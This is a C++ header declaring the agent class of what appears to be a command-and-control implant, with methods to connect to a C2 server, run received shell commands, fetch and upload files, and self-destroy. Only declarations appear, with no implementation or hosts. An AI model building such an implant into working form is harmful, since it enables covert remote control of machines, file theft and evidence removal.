#pragma once

#include <string>
#include <chell/common/network/protobuf_connection.hpp>
#include <aperture_protos/commands.pb.h>

using namespace aperture_protos;


namespace chell {

class Agent {
public:
    bool wasDestroyed;
   
    Agent();
    ~Agent();

    // Disable copying for RAII integrity
    Agent(const Agent&) = delete;
    Agent& operator=(const Agent&) = delete;

    void run(const std::string& ip, int port);

private:
    std::unique_ptr<chell::network::ProtobufConnection> m_connection;

    void c2Connect(const std::string& ip, int port);
    void c2Disconnect();

    commands::Request recvCommandRequest();
    void sendCommandResponse(commands::Response& response);
    commands::Response processCommandRequest(commands::Request& request);

    std::string handleExecute(const std::string& command);
    void handleSelfDestroy();
    void handleGetFile(const std::string& path, std::uint32_t suggestedChunkSize);
    void handlePutFile(const std::string& path);
};

}
